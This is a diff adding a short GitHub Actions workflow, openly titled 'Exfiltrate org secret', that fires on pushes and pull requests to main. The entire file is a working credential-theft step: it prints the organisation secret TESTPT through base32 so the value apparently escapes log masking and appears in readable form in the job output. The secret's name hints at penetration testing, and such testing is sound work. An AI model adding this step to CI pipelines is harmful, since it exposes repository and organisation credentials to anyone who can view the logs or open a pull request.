@@ -1,0 +1,15 @@
+name: Exfiltrate org secret
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+    - name: exfil org secret
+      id: response
+      run:  |
+          echo "lets exfil some org secrets..."
+          echo "${{secrets.TESTPT}}" | base32
